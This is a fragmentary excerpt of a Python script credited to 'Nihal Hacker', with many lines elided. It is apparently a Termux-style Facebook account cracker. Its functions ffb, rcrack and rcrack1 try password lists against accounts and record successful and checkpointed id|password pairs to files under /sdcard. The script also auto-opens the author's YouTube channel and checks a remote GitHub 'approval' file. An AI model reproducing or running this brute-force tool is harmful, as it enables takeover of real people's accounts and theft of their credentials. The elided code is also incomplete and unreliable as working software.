...
import os,base64
os.system('xdg-open https://youtube.com/@NihalHackerhamzayt6210/')
...
\033[1;32m\__|  \__|\______|\__|  \__|\__|  \__|\________|
                
╔══════════════════════════════════════╗
║        WELCOME TO Nihal Hacker COMMAND     ║     
╚══════════════════════════════════════╝                                     
╔══════════════════════════════════════╗
║\033[1;97m[+] DEVOLPER   :      Nihal Hacker         ║
║\033[1;97m[+] FACEBOOK   : NihalHacker               ║
║\033[1;97m[+] WHATSAPP   : 03135887979           ║
║\033[1;97m[+] GITHUB        :  Nihal Hacker              ║
║\033[1;97m[+] VERTION    : 1.8                                   ║
╚══════════════════════════════════════╝""")
def linex():
	print('----------------------------------------------')
def clear():
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/NihalHackertxt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/NihalHacker.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/NihalHackertxt\033[0;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [NihalHacker] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [NihalHacker-OK] %s | %s'%(ids,pas))
				open('/sdcard/NihalHacker-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [NihalHacker-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/NihalHacker-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [NihalHacker-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/NihalHacker-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [NihalHacker] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [NihalHacker-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [NihalHacker-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/NihalHacker/Approval.txt').text
...
\033[1;32m\__|  \__|\______|\__|  \__|\__|  \__|\________|
                        _______________________________________
\033[1;37m[-] AUTHOR    :\033[1;32m NihalHacker 
\033[1;37m[-] GITHUB    :\033[1;32m NihalHacker
